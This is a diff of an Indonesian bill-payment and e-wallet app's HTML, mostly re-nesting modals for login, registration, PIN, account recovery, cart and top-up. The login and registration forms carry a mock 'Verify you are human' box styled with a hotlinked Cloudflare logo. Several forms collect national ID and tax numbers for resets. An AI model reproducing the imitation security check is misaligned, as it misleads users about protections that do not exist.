+                        <div class="service-icon"><i class="bi bi-bus-front-fill"></i></div>
+                        <div class="service-name">Bus & Travel</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Kapal Laut')">
+                        <div class="service-icon"><i class="bi bi-water"></i></div>
+                        <div class="service-name">Kapal Pelni</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Hotel')">
+                        <div class="service-icon"><i class="bi bi-building"></i></div>
+                        <div class="service-name">Hotel</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('BPJS Kesehatan')">
+                        <div class="service-icon"><i class="bi bi-heart-pulse"></i></div>
+                        <div class="service-name">BPJS Kes</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('BPJS Ketenagakerjaan')">
+                        <div class="service-icon"><i class="bi bi-briefcase-fill"></i></div>
+                        <div class="service-name">BPJS TK</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Asuransi')">
+                        <div class="service-icon"><i class="bi bi-shield-check"></i></div>
+                        <div class="service-name">Asuransi</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Telemedicine')">
+                        <div class="service-icon"><i class="bi bi-capsule"></i></div>
+                        <div class="service-name">Telemedicine</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('PBB')">
+                        <div class="service-icon"><i class="bi bi-buildings"></i></div>
+                        <div class="service-name">Pajak PBB</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Samsat')">
+                        <div class="service-icon"><i class="bi bi-car-front"></i></div>
+                        <div class="service-name">E-Samsat</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Penerimaan Negara')">
+                        <div class="service-icon"><i class="bi bi-bank"></i></div>
+                        <div class="service-name">Negara</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('IPL')">
+                        <div class="service-icon"><i class="bi bi-house-gear-fill"></i></div>
+                        <div class="service-name">IPL / Retribusi</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Pasca Bayar')">
+                        <div class="service-icon"><i class="bi bi-receipt"></i></div>
+                        <div class="service-name">Pasca Bayar</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Pendidikan')">
+                        <div class="service-icon"><i class="bi bi-mortarboard-fill"></i></div>
+                        <div class="service-name">Pendidikan</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Multifinance')">
+                        <div class="service-icon"><i class="bi bi-cash-stack"></i></div>
+                        <div class="service-name">Angsuran</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Kartu Kredit')">
+                        <div class="service-icon"><i class="bi bi-credit-card"></i></div>
+                        <div class="service-name">Kartu Kredit</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Investasi')">
+                        <div class="service-icon"><i class="bi bi-coin"></i></div>
+                        <div class="service-name">Investasi</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Voucher Makanan')">
+                        <div class="service-icon"><i class="bi bi-shop"></i></div>
+                        <div class="service-name">Voucher F&B</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Voucher Belanja')">
+                        <div class="service-icon"><i class="bi bi-bag-heart-fill"></i></div>
+                        <div class="service-name">Belanja</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Zakat')">
+                        <div class="service-icon"><i class="bi bi-heart-fill"></i></div>
+                        <div class="service-name">Zakat & Donasi</div>
+                    </div>
+                    <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Qurban')">
+                        <div class="service-icon"><i class="bi bi-box2-heart-fill"></i></div>
+                        <div class="service-name">Qurban</div>
+                    </div>
                 </div>
             </div>
         </div>
@@ -809,46 +830,46 @@
                 <h3>Keranjang Flashsale</h3>
                 <button class="btn-icon" onclick="closeTargetModal('cart-modal')"><i class="bi bi-x-lg"></i></button>
             </div>
-            
-            <div id="cart-items-container" style="margin-bottom:15px;">
+            <div class="modal-body">
+                <div id="cart-items-container" style="margin-bottom:15px;"></div>
+                
+                <div id="cart-provider-box" style="display:none;">
+                    <div class="input-group">
+                        <label>Pilih E-Wallet Penerima</label>
+                        <select id="cart-provider">
+                            <option value="OVO">OVO</option>
+                            <option value="DANA">DANA</option>
+                            <option value="GOPAY">Gopay</option>
+                            <option value="SHOPEEPAY">ShopeePay</option>
+                            <option value="LinkAja">LinkAja</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label>Nomor Penerima E-Wallet</label>
+                        <input type="number" id="cart-target" placeholder="Masukkan nomor">
+                    </div>
                 </div>
-            
-            <div id="cart-provider-box" style="display:none;">
-                <div class="input-group">
-                    <label>Pilih E-Wallet Penerima</label>
-                    <select id="cart-provider">
-                        <option value="OVO">OVO</option>
-                        <option value="DANA">DANA</option>
-                        <option value="GOPAY">Gopay</option>
-                        <option value="SHOPEEPAY">ShopeePay</option>
-                        <option value="LinkAja">LinkAja</option>
-                    </select>
-                </div>
-                <div class="input-group">
-                    <label>Nomor Penerima E-Wallet</label>
-                    <input type="number" id="cart-target" placeholder="Masukkan nomor">
-                </div>
-            </div>
 
-            <div class="input-group" id="promo-code-input-box">
-                <label>Masukkan Kode Voucher Promo</label>
-                <div style="display: flex; gap: 8px;">
-                    <input type="text" id="promo-code" placeholder="Masukkan kode" style="flex:1;">
-                    <button onclick="applyPromo()" style="padding: 0 15px; border-radius: 14px; background: var(--primary); border:none; color:#fff; font-weight:bold;">Gunakan</button>
-                </div>
-            </div>
-            
-            <div id="cart-actions-box" style="display:none;">
-                <div style="background: var(--bg-input); padding: 18px; border-radius: 16px; margin-top: 15px;">
-                    <div class="cart-summary-row" style="display:flex; justify-content:space-between; font-size:13px; margin-bottom:6px;"><span style="color:var(--text-muted);">Nilai Produk</span><span id="cart-subtotal" style="font-weight:700;">Rp 0</span></div>
-                    <div class="cart-summary-row" style="display:flex; justify-content:space-between; font-size:13px; margin-bottom:6px;"><span style="color:var(--text-muted);">Biaya Admin</span><span style="font-weight:700; color:var(--success);">Rp 0</span></div>
-                    <div class="cart-summary-row" style="display:flex; justify-content:space-between; font-size:13px; margin-bottom:6px;"><span style="color:var(--text-muted);">Potongan Promo</span><span id="cart-discount" style="font-weight:700; color:var(--success);">Rp 0</span></div>
-                    <hr style="border:0; border-top:1px dashed var(--border-color); margin: 12px 0;">
-                    <div class="cart-summary-row" style="display:flex; justify-content:space-between; font-size:15px; font-weight:800;"><span style="color:var(--text-main);">Total Bayar</span><span id="cart-total" style="color:var(--primary);">Rp 0</span></div>
+                <div class="input-group" id="promo-code-input-box">
+                    <label>Masukkan Kode Voucher Promo</label>
+                    <div style="display: flex; gap: 8px;">
+                        <input type="text" id="promo-code" placeholder="Masukkan kode" style="flex:1;">
+                        <button onclick="applyPromo()" style="padding: 0 15px; border-radius: 14px; background: var(--primary); border:none; color:#fff; font-weight:bold;">Gunakan</button>
+                    </div>
                 </div>
                 
-                <button class="btn-modal" onclick="proceedCartCheckout()">Lanjutkan</button>
-                <button class="btn-modal btn-modal-danger" onclick="clearCart()">Batalkan</button>
+                <div id="cart-actions-box" style="display:none;">
+                    <div style="background: var(--bg-input); padding: 18px; border-radius: 16px; margin-top: 15px;">
+                        <div class="cart-summary-row" style="display:flex; justify-content:space-between; font-size:13px; margin-bottom:6px;"><span style="color:var(--text-muted);">Nilai Produk</span><span id="cart-subtotal" style="font-weight:700;">Rp 0</span></div>
+                        <div class="cart-summary-row" style="display:flex; justify-content:space-between; font-size:13px; margin-bottom:6px;"><span style="color:var(--text-muted);">Biaya Admin</span><span style="font-weight:700; color:var(--success);">Rp 0</span></div>
+                        <div class="cart-summary-row" style="display:flex; justify-content:space-between; font-size:13px; margin-bottom:6px;"><span style="color:var(--text-muted);">Potongan Promo</span><span id="cart-discount" style="font-weight:700; color:var(--success);">Rp 0</span></div>
+                        <hr style="border:0; border-top:1px dashed var(--border-color); margin: 12px 0;">
+                        <div class="cart-summary-row" style="display:flex; justify-content:space-between; font-size:15px; font-weight:800;"><span style="color:var(--text-main);">Total Bayar</span><span id="cart-total" style="color:var(--primary);">Rp 0</span></div>
+                    </div>
+                    
+                    <button class="btn-modal" onclick="proceedCartCheckout()">Konfirmasi</button>
+                    <button class="btn-modal btn-modal-danger" onclick="clearCart()">Batalkan</button>
+                </div>
             </div>
         </div>
     </div>
@@ -876,28 +897,30 @@
                 <h3>Ubah Password Akun</h3>
                 <button class="btn-icon" onclick="closeTargetModal('change-password-modal')"><i class="bi bi-x-lg"></i></button>
             </div>
-            <div class="input-group">
-                <label>Password Lama</label>
-                <div class="pass-input-wrapper">
-                    <input type="password" id="old-password-field" placeholder="Masukkan password saat ini">
-                    <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('old-password-field', this)"></i>
+            <div class="modal-body">
+                <div class="input-group">
+                    <label>Password Lama</label>
+                    <div class="pass-input-wrapper">
+                        <input type="password" id="old-password-field" placeholder="Masukkan password saat ini">
+                        <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('old-password-field', this)"></i>
+                    </div>
                 </div>
-            </div>
-            <div class="input-group">
-                <label>Password Baru</label>
-                <div class="pass-input-wrapper">
-                    <input type="password" id="new-password-field" placeholder="Masukkan password baru">
-                    <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('new-password-field', this)"></i>
+                <div class="input-group">
+                    <label>Password Baru</label>
+                    <div class="pass-input-wrapper">
+                        <input type="password" id="new-password-field" placeholder="Masukkan password baru">
+                        <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('new-password-field', this)"></i>
+                    </div>
                 </div>
-            </div>
-            <div class="input-group">
-                <label>Konfirmasi Password Baru</label>
-                <div class="pass-input-wrapper">
-                    <input type="password" id="confirm-password-field" placeholder="Ketik ulang password baru">
-                    <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('confirm-password-field', this)"></i>
+                <div class="input-group">
+                    <label>Konfirmasi Password Baru</label>
+                    <div class="pass-input-wrapper">
+                        <input type="password" id="confirm-password-field" placeholder="Ketik ulang password baru">
+                        <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('confirm-password-field', this)"></i>
+                    </div>
                 </div>
+                <button class="btn-modal" onclick="processChangePassword()">Simpan Password</button>
             </div>
-            <button class="btn-modal" onclick="processChangePassword()">Simpan Password</button>
         </div>
     </div>
 
@@ -907,19 +930,21 @@
                 <h3>Ubah PIN Transaksi</h3>
                 <button class="btn-icon" onclick="closeTargetModal('change-pin-modal')"><i class="bi bi-x-lg"></i></button>
             </div>
-            <div class="input-group">
-                <label>PIN Lama</label>
-                <input type="password" id="old-pin-field" maxlength="6" pattern="[0-9]*" inputmode="numeric" placeholder="Masukkan PIN lama">
+            <div class="modal-body">
+                <div class="input-group">
+                    <label>PIN Lama</label>
+                    <input type="password" id="old-pin-field" maxlength="6" pattern="[0-9]*" inputmode="numeric" placeholder="Masukkan PIN lama">
+                </div>
+                <div class="input-group">
+                    <label>PIN Baru</label>
+                    <input type="password" id="new-pin-field" maxlength="6" pattern="[0-9]*" inputmode="numeric" placeholder="Masukkan PIN baru (6 digit)">
+                </div>
+                <div class="input-group">
+                    <label>Konfirmasi PIN Baru</label>
+                    <input type="password" id="confirm-pin-field" maxlength="6" pattern="[0-9]*" inputmode="numeric" placeholder="Konfirmasi PIN baru">
+                </div>
+                <button class="btn-modal" onclick="processChangePin()">Simpan PIN</button>
             </div>
-            <div class="input-group">
-                <label>PIN Baru</label>
-                <input type="password" id="new-pin-field" maxlength="6" pattern="[0-9]*" inputmode="numeric" placeholder="Masukkan PIN baru (6 digit)">
-            </div>
-            <div class="input-group">
-                <label>Konfirmasi PIN Baru</label>
-                <input type="password" id="confirm-pin-field" maxlength="6" pattern="[0-9]*" inputmode="numeric" placeholder="Konfirmasi PIN baru">
-            </div>
-            <button class="btn-modal" onclick="processChangePin()">Simpan PIN</button>
         </div>
     </div>
 
@@ -929,33 +954,35 @@
                 <h3>Masuk Akun</h3>
                 <button class="btn-icon" id="login-close-btn" onclick="closeTargetModal('login-modal')"><i class="bi bi-x-lg"></i></button>
             </div>
-            <div class="input-group">
-                <label>Nomor Handphone</label>
-                <input type="tel" id="login-phone" placeholder="Masukkan nomor">
-            </div>
-            <div class="input-group">
-                <label>Password</label>
-                <div class="pass-input-wrapper">
-                    <input type="password" id="login-password" placeholder="Masukkan password">
-                    <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('login-password', this)"></i>
+            <div class="modal-body">
+                <div class="input-group">
+                    <label>Nomor Handphone</label>
+                    <input type="tel" id="login-phone" placeholder="Masukkan nomor">
                 </div>
-            </div>
-            
-            <div class="cf-captcha-box" onclick="verifyCaptcha('login')">
-                <div style="display: flex; align-items: center; gap: 15px;">
-                    <div class="cf-checkbox" id="cf-box-login"><i class="bi bi-check-lg"></i></div>
-                    <div class="cf-text-wrap">
-                        <span>Verify you are human</span>
+                <div class="input-group">
+                    <label>Password</label>
+                    <div class="pass-input-wrapper">
+                        <input type="password" id="login-password" placeholder="Masukkan password">
+                        <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('login-password', this)"></i>
                     </div>
                 </div>
-                <div class="cf-logo-box">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.png" height="20" alt="CF">
-                    <span>Privacy - Terms</span>
+                
+                <div class="cf-captcha-box" onclick="verifyCaptcha('login')">
+                    <div style="display: flex; align-items: center; gap: 15px;">
+                        <div class="cf-checkbox" id="cf-box-login"><i class="bi bi-check-lg"></i></div>
+                        <div class="cf-text-wrap">
+                            <span>Verify you are human</span>
+                        </div>
+                    </div>
+                    <div class="cf-logo-box">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.png" height="20" alt="CF">
+                        <span>Privacy - Terms</span>
+                    </div>
                 </div>
-            </div>
 
-            <button class="btn-modal" onclick="processLogin()">Masuk</button>
-            <div class="auth-link" onclick="closeTargetModal('login-modal'); openRegisterModal();">Belum punya akun? <span>Daftar disini</span></div>
+                <button class="btn-modal" onclick="processLogin()">Masuk</button>
+                <div class="auth-link" onclick="closeTargetModal('login-modal'); openRegisterModal();">Belum punya akun? <span>Daftar disini</span></div>
+            </div>
         </div>
     </div>
 
@@ -965,41 +992,43 @@
                 <h3>Daftar Akun Baru</h3>
                 <button class="btn-icon" id="register-close-btn" onclick="closeTargetModal('register-modal')"><i class="bi bi-x-lg"></i></button>
             </div>
-            <div class="input-group">
-                <label>Nama Lengkap</label>
-                <input type="text" id="reg-name" placeholder="Masukkan nama">
-            </div>
-            <div class="input-group">
-                <label>Nomor Handphone</label>
-                <input type="tel" id="reg-phone" placeholder="Masukkan nomor">
-            </div>
-            <div class="input-group">
-                <label>Buat Password</label>
-                <div class="pass-input-wrapper">
-                    <input type="password" id="reg-password" placeholder="Minimal 6 karakter">
-                    <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('reg-password', this)"></i>
+            <div class="modal-body">
+                <div class="input-group">
+                    <label>Nama Lengkap</label>
+                    <input type="text" id="reg-name" placeholder="Masukkan nama">
                 </div>
-            </div>
-            <div class="input-group">
-                <label>Kode Referensi</label>
-                <input type="text" id="reg-ref" placeholder="Masukkan kode referensi">
-            </div>
-            
-            <div class="cf-captcha-box" onclick="verifyCaptcha('reg')">
-                <div style="display: flex; align-items: center; gap: 15px;">
-                    <div class="cf-checkbox" id="cf-box-reg"><i class="bi bi-check-lg"></i></div>
-                    <div class="cf-text-wrap">
-                        <span>Verify you are human</span>
+                <div class="input-group">
+                    <label>Nomor Handphone</label>
+                    <input type="tel" id="reg-phone" placeholder="Masukkan nomor">
+                </div>
+                <div class="input-group">
+                    <label>Buat Password</label>
+                    <div class="pass-input-wrapper">
+                        <input type="password" id="reg-password" placeholder="Minimal 6 karakter">
+                        <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('reg-password', this)"></i>
                     </div>
                 </div>
-                <div class="cf-logo-box">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.png" height="20" alt="CF">
-                    <span>Privacy - Terms</span>
+                <div class="input-group">
+                    <label>Kode Referensi</label>
+                    <input type="text" id="reg-ref" placeholder="Masukkan kode referensi">
                 </div>
-            </div>
+                
+                <div class="cf-captcha-box" onclick="verifyCaptcha('reg')">
+                    <div style="display: flex; align-items: center; gap: 15px;">
+                        <div class="cf-checkbox" id="cf-box-reg"><i class="bi bi-check-lg"></i></div>
+                        <div class="cf-text-wrap">
+                            <span>Verify you are human</span>
+                        </div>
+                    </div>
+                    <div class="cf-logo-box">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.png" height="20" alt="CF">
+                        <span>Privacy - Terms</span>
+                    </div>
+                </div>
 
-            <button class="btn-modal" onclick="processRegister()">Daftar Sekarang</button>
-            <div class="auth-link" onclick="closeTargetModal('register-modal'); openLoginModal();">Sudah punya akun? <span>Masuk disini</span></div>
+                <button class="btn-modal" onclick="processRegister()">Daftar Sekarang</button>
+                <div class="auth-link" onclick="closeTargetModal('register-modal'); openLoginModal();">Sudah punya akun? <span>Masuk disini</span></div>
+            </div>
         </div>
     </div>
 
@@ -1009,13 +1038,15 @@
                 <h3>Pemulihan Akun</h3>
                 <button class="btn-icon" onclick="closeTargetModal('recovery-modal')"><i class="bi bi-x-lg"></i></button>
             </div>
-            <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 15px;">Nomor sudah terdaftar! Masukkan NIK KTP terverifikasi Anda untuk memulihkan dan mereset credential sandi akun Anda.</p>
-            <div class="input-group">
-                <label>Nomor NIK KTP Akun</label>
-                <input type="number" id="recovery-nik" placeholder="16 Digit NIK KTP Anda">
+            <div class="modal-body">
+                <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 15px;">Nomor sudah terdaftar! Masukkan NIK KTP terverifikasi Anda untuk memulihkan dan mereset credential sandi akun Anda.</p>
+                <div class="input-group">
+                    <label>Nomor NIK KTP Akun</label>
+                    <input type="number" id="recovery-nik" placeholder="16 Digit NIK KTP Anda">
+                </div>
+                <button class="btn-modal" onclick="processNikRecovery()">Verifikasi</button>
+                <button class="btn-modal btn-modal-danger" onclick="closeTargetModal('recovery-modal'); showModal('Hubungi Bantuan','Gagal memverifikasi NIK KTP Harap hubungi Customer Support untuk reset pendaftaran nomor handphone Anda.','error')">Hubungi Bantuan</button>
             </div>
-            <button class="btn-modal" onclick="processNikRecovery()">Verifikasi</button>
-            <button class="btn-modal btn-modal-danger" onclick="closeTargetModal('recovery-modal'); showModal('Hubungi Bantuan','Gagal memverifikasi NIK KTP Harap hubungi Customer Support untuk reset pendaftaran nomor handphone Anda.','error')">Hubungi Bantuan</button>
         </div>
     </div>
 
@@ -1025,13 +1056,15 @@
                 <h3>Reset PIN Transaksi</h3>
                 <button class="btn-icon" onclick="closeTargetModal('reset-pin-nik-modal')"><i class="bi bi-x-lg"></i></button>
             </div>
-            <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 15px;">Anda salah memasukkan PIN silakan verifikasi Nomor Induk Kependudukan (NIK KTP) untuk mereset PIN transaksi.</p>
-            <div class="input-group">
-                <label>Nomor NIK KTP (16 Digit)</label>
-                <input type="number" id="reset-pin-nik-input" placeholder="Masukkan NIK Anda yang terdaftar">
+            <div class="modal-body">
+                <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 15px;">Anda salah memasukkan PIN silakan verifikasi Nomor Induk Kependudukan (NIK KTP) untuk mereset PIN transaksi.</p>
+                <div class="input-group">
+                    <label>Nomor NIK KTP (16 Digit)</label>
+                    <input type="number" id="reset-pin-nik-input" placeholder="Masukkan NIK Anda yang terdaftar">
+                </div>
+                <button class="btn-modal" onclick="processResetPinNik()">Verifikasi</button>
+                <button class="btn-modal btn-modal-danger" onclick="closeTargetModal('reset-pin-nik-modal'); showModal('Hubungi Bantuan','Jika Anda mengalami kendala atau NIK tidak sesuai harap hubungi Customer Support.','error')">Hubungi Bantuan</button>
             </div>
-            <button class="btn-modal" onclick="processResetPinNik()">Verifikasi</button>
-            <button class="btn-modal btn-modal-danger" onclick="closeTargetModal('reset-pin-nik-modal'); showModal('Hubungi Bantuan','Jika Anda mengalami kendala atau NIK tidak sesuai harap hubungi Customer Support.','error')">Hubungi Bantuan</button>
         </div>
     </div>
 
@@ -1041,15 +1074,17 @@
                 <h3>Buat PIN Transaksi</h3>
                 <button class="btn-icon" onclick="closeTargetModal('pin-setup-modal')"><i class="bi bi-x-lg"></i></button>
             </div>
-            <div class="input-group">
-                <label>Buat PIN Baru</label>
-                <input type="password" id="pin-1" maxlength="6" pattern="[0-9]*" inputmode="numeric" placeholder="Masukkan 6 digit angka">
+            <div class="modal-body">
+                <div class="input-group">
+                    <label>Buat PIN Baru</label>
+                    <input type="password" id="pin-1" maxlength="6" pattern="[0-9]*" inputmode="numeric" placeholder="Masukkan 6 digit angka">
+                </div>
+                <div class="input-group">
+                    <label>Konfirmasi Ulang PIN</label>
+                    <input type="password" id="pin-2" maxlength="6" pattern="[0-9]*" inputmode="numeric" placeholder="Konfirmasi 6 digit angka">
+                </div>
+                <button class="btn-modal" onclick="processPinSetup()">Simpan PIN Proteksi</button>
             </div>
-            <div class="input-group">
-                <label>Konfirmasi Ulang PIN</label>
-                <input type="password" id="pin-2" maxlength="6" pattern="[0-9]*" inputmode="numeric" placeholder="Konfirmasi 6 digit angka">
-            </div>
-            <button class="btn-modal" onclick="processPinSetup()">Simpan PIN Proteksi</button>
         </div>
     </div>
 
@@ -1059,11 +1094,13 @@
                 <h3>Konfirmasi PIN</h3>
                 <button class="btn-icon" onclick="closeTargetModal('pin-auth-modal')"><i class="bi bi-x-lg"></i></button>
             </div>
-            <div class="input-group">
-                <label>Masukkan PIN Transaksi Anda</label>
-                <input type="password" id="auth-pin-input" maxlength="6" pattern="[0-9]*" inputmode="numeric" placeholder="------" style="text-align: center; letter-spacing: 10px; font-size: 20px;">
+            <div class="modal-body">
+                <div class="input-group">
+                    <label>Masukkan PIN Transaksi Anda</label>
+                    <input type="password" id="auth-pin-input" maxlength="6" pattern="[0-9]*" inputmode="numeric" placeholder="------" style="text-align: center; letter-spacing: 10px; font-size: 20px;">
+                </div>
+                <button class="btn-modal" onclick="verifyPinAction()">Verifikasi</button>
             </div>
-            <button class="btn-modal" onclick="verifyPinAction()">Verifikasi</button>
         </div>
     </div>
 
@@ -1073,40 +1110,52 @@
                 <h3>Verifikasi Reseller</h3>
                 <button class="btn-icon" onclick="closeTargetModal('reseller-verif-modal')"><i class="bi bi-x-lg"></i></button>
             </div>
-            <div class="input-group"><label>Nama Sesuai Dokumen KTP</label><input type="text" id="res-corp-name" placeholder="Nama Lengkap"></div>
-            <div class="input-group"><label>Nomor NIK KTP (16 Digit)</label><input type="number" id="res-nik-input" placeholder="Masukkan 16 Digit NIK"></div>
-            <div class="input-group"><label>Nomor NPWP Pribadi</label><input type="number" id="res-npwp" placeholder="Nomor NPWP Aktif"></div>
-            <div class="input-group"><label>Surat Izin Usaha / Dokumen Pendukung</label><input type="file" id="res-doc" style="padding:10px; background:var(--bg-card);"></div>
-            <button class="btn-modal" onclick="submitResellerVerification()">Verifikasi</button>
+            <div class="modal-body">
+                <div class="input-group">
+                    <label>Nama Sesuai Dokumen KTP</label>
+                    <input type="text" id="res-corp-name" placeholder="Nama Lengkap">
+                </div>
+                <div class="input-group">
+                    <label>Nomor NIK KTP (16 Digit)</label>
+                    <input type="number" id="res-nik-input" placeholder="Masukkan 16 Digit NIK">
+                </div>
+                <div class="input-group">
+                    <label>Nomor NPWP Pribadi</label>
+                    <input type="number" id="res-npwp" placeholder="Nomor NPWP Aktif">
+                </div>
+                <div class="input-group">
+                    <label>Surat Izin Usaha / Dokumen Pendukung</label>
+                    <input type="file" id="res-doc" style="padding:10px; background:var(--bg-card);">
+                </div>
+                <button class="btn-modal" onclick="submitResellerVerification()">Verifikasi</button>
+            </div>
         </div>
     </div>
 
     <div id="downline-modal" class="modal-overlay">
-    <div class="modal-content">
-        <div class="modal-header">
-            <h3>Program Referensi</h3>
-            <button class="btn-icon" onclick="closeTargetModal('downline-modal')"><i class="bi bi-x-lg"></i></button>
-        </div>
-
-        <div class="ref-card">
-            <div style="font-size: 12px; opacity: 0.9;">Kode Referensi Anda</div>
-            <div class="ref-code-box" id="downline-ref-code-text"></div>
-            <div style="font-size: 11px; margin-top: 12px; opacity: 0.8;">Dapatkan komisi Rp 50.000 setelah downline melakukan transaksi pertama.</div>
-        </div>
-
-        <div id="downline-list-box" style="display:flex; flex-direction:column; max-height:250px; overflow-y:auto;">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Program Referensi</h3>
+                <button class="btn-icon" onclick="closeTargetModal('downline-modal')"><i class="bi bi-x-lg"></i></button>
+            </div>
+            <div class="modal-body">
+                <div class="ref-card">
+                    <div style="font-size: 12px; opacity: 0.9;">Kode Referensi Anda</div>
+                    <div class="ref-code-box" id="downline-ref-code-text"></div>
+                    <div style="font-size: 11px; margin-top: 12px; opacity: 0.8;">Dapatkan komisi Rp 50.000 setelah downline melakukan transaksi pertama.</div>
+                </div>
+                <div id="downline-list-box" style="display:flex; flex-direction:column; max-height:250px; overflow-y:auto;"></div>
             </div>
         </div>
     </div>
 
     <div id="notif-modal" class="modal-overlay">
-        <div class="modal-content" style="padding:0; overflow:hidden;">
-            <div style="padding: 20px 25px; border-bottom: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center; background: var(--bg-card);">
-                <h3 style="color:var(--text-main); margin:0; font-size: 18px;">Notifikasi</h3>
-                <button class="btn-icon" style="font-size: 20px;" onclick="closeTargetModal('notif-modal')"><i class="bi bi-x-lg"></i></button>
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Notifikasi</h3>
+                <button class="btn-icon" onclick="closeTargetModal('notif-modal')"><i class="bi bi-x-lg"></i></button>
             </div>
-            <div id="notif-list-container" style="max-height: 60vh; overflow-y: auto; background: var(--bg-container); padding: 15px;">
-                </div>
+            <div class="modal-body" id="notif-list-container" style="padding: 15px;"></div>
         </div>
     </div>
 
@@ -1116,80 +1165,82 @@
                 <h3>Isi Saldo</h3>
                 <button class="btn-icon" onclick="closeTargetModal('deposit-modal')"><i class="bi bi-x-lg"></i></button>
             </div>
-            
-            <div id="deposit-step-1">
-                <div style="font-size: 11px; color: var(--success); text-align: center; margin-bottom: 15px; font-weight: 600;">
-                </div>
-
-                <div class="input-group">
-                    <label>Nominal Top-up (Min. Rp 50.000)</label>
-                    <input type="number" id="deposit-amount" placeholder="Masukkan nominal">
-                </div>
-                
-                <div style="display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 20px;">
-                    <button class="quick-nominal-btn" onclick="setNominal(50000)">Rp 50.000</button>
-                    <button class="quick-nominal-btn" onclick="setNominal(100000)">Rp 100.000</button>
-                    <button class="quick-nominal-btn" onclick="setNominal(150000)">Rp 150.000</button>
-                    <button class="quick-nominal-btn" onclick="setNominal(200000)">Rp 200.000</button>
-                    <button class="quick-nominal-btn" onclick="setNominal(250000)">Rp 250.000</button>
-                    <button class="quick-nominal-btn" onclick="setNominal(500000)">Rp 500.000</button>
-                </div>
-                
-                <label style="font-size: 13px; color: var(--text-muted); font-weight: 600; margin-bottom: 8px; display: block;">Pilih Metode Pembayaran</label>
-                <div style="display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px;">
-                    <div class="payment-card active" id="pm-qris">
-                        <div style="display:flex; justify-content:space-between; align-items:center;">
-                            <span style="font-weight:700;"><i class="bi bi-qr-code-scan"></i> QRIS Merchant</span>
-                            <span style="font-size: 11px; padding: 4px 8px; background: rgba(16,185,129,0.1); color: var(--success); border-radius: 6px; font-weight: bold;">Tersedia</span>
-                        </div>
-                        <div style="font-size: 12px; color: var(--success); margin-top: 6px; font-weight:600;">Diproses 1-5 menit</div>
+            <div class="modal-body">
+                <div id="deposit-step-1">
+                    <div style="font-size: 11px; color: var(--success); text-align: center; margin-bottom: 15px; font-weight: 600;"></div>
+                    <div class="input-group">
+                        <label>Nominal Top-up (Min. Rp 50.000)</label>
+                        <input type="number" id="deposit-amount" placeholder="Masukkan nominal">
                     </div>
                     
-                    <div class="payment-card disabled">
-                        <div style="display:flex; justify-content:space-between; align-items:center;">
-                            <span style="font-weight:700; color:var(--text-muted);"><i class="bi bi-bank"></i> Virtual Account Bank</span>
-                            <span style="font-size: 11px; padding: 4px 8px; background: rgba(239,68,68,0.1); color: var(--danger); border-radius: 6px; font-weight: bold;">Offline</span>
+                    <div style="display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 20px;">
+                        <button class="quick-nominal-btn" onclick="setNominal(50000)">Rp 50.000</button>
+                        <button class="quick-nominal-btn" onclick="setNominal(100000)">Rp 100.000</button>
+                        <button class="quick-nominal-btn" onclick="setNominal(150000)">Rp 150.000</button>
+                        <button class="quick-nominal-btn" onclick="setNominal(200000)">Rp 200.000</button>
+                        <button class="quick-nominal-btn" onclick="setNominal(250000)">Rp 250.000</button>
